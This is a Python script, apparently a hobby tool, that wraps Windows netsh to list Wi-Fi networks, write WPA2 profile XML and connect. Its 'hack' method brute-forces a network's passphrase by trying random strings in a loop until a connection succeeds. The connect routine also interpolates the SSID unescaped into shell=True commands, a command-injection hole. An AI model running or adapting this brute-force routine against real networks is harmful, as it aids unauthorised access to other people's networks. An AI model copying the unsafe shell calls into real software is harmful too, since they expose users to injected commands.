import subprocess
import time
import os
import string
from random import *


class Network:

    def createXML(self, name, password):
        xmlContent = f"""<?xml version="1.0"?>
        <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
            <name>{name}</name>
            <SSIDConfig>
                <SSID>
                    <name>{name}</name>
                </SSID>
            </SSIDConfig>
            <connectionType>ESS</connectionType>
            <connectionMode>auto</connectionMode>
            <MSM>
                <security>
                    <authEncryption>
                        <authentication>WPA2PSK</authentication>
                        <encryption>AES</encryption>
                        <useOneX>false</useOneX>
                    </authEncryption>
                    <sharedKey>
                        <keyType>passPhrase</keyType>
                        <protected>false</protected>
                        <keyMaterial>{password}</keyMaterial>
                    </sharedKey>
                </security>
            </MSM>
        </WLANProfile>"""
        with open(f'{name}.xml', 'w') as file:
            file.write(xmlContent)

    def list(self):
        try:
            # Executar o comando para listar redes Wi-Fi disponíveis
            result = subprocess.run(['netsh', 'wlan', 'show', 'network'], capture_output=True, text=True)

            # Processar a saída, se necessário
            networks = []
            for line in result.stdout.split('\n'):
                if "SSID" in line:
                    networks.append(line.split(" : ")[1].strip())
            
            print("Redes Wi-Fi disponíveis:")
            for network in networks:
                print(network)
                
        except subprocess.CalledProcessError as e:
            print(f'Erro ao listar redes Wi-Fi: {e}')

    def connect(self, ssid, password):
        try:
            self.createXML(ssid, password)

            if profile_exists(ssid):
                subprocess.run(['netsh', 'wlan', 'delete', 'profile', f'name={ssid}'], shell=True, check=True)
                time.sleep(2)

            create_profile = f'netsh wlan add profile filename="{ssid}.xml"'
            subprocess.run(create_profile, shell=True, check=True)
            time.sleep(2)

            connect = f'netsh wlan connect name="{ssid}"'
            subprocess.run(connect, shell=True, check=True)
            time.sleep(2)

            if self.check_connection():
                print(f'Você está conectado à rede Wi-Fi: {ssid}')
            else:
                print(f'Você não está conectado a nenhuma rede Wi-Fi.')

        except subprocess.CalledProcessError as e:
            print(f'Erro ao conectar-se à rede Wi-Fi: {e}')
        except ValueError as e:
            print(e)
        finally:
            if os.path.exists(f'{ssid}.xml'):
                os.remove(f'{ssid}.xml')

    def hack(self, ssid):
        letters = string.ascii_letters
        digits = string.digits
        chars = letters+digits

        min_len = 8
        max_len = 16

        passwordsList = []

        while not self.check_connection():
            # Gera uma senha aleatória
            generatedPassword = "".join(choice(chars) for _ in range(randint(min_len, max_len)))

            if generatedPassword not in passwordsList:
                self.connect(ssid, generatedPassword)
            
            passwordsList.append(generatedPassword)
            print(f'List passwords: {passwordsList}')


    def check_connection(self):
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)

            connected = None
            for line in result.stdout.split('\n'):
                if "Estado" in line:
                    connected = line.split(" : ")[1].strip()
                    break

            if connected == "Conectado":
                return True

        except subprocess.CalledProcessError as e:
            print(f'Erro ao verificar a conexão Wi-Fi: {e}')

        return False


def profile_exists(ssid):
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        return ssid in result.stdout
    except subprocess.CalledProcessError as e:
        print(f'Erro ao listar perfis de rede Wi-Fi: {e}')
        return False
    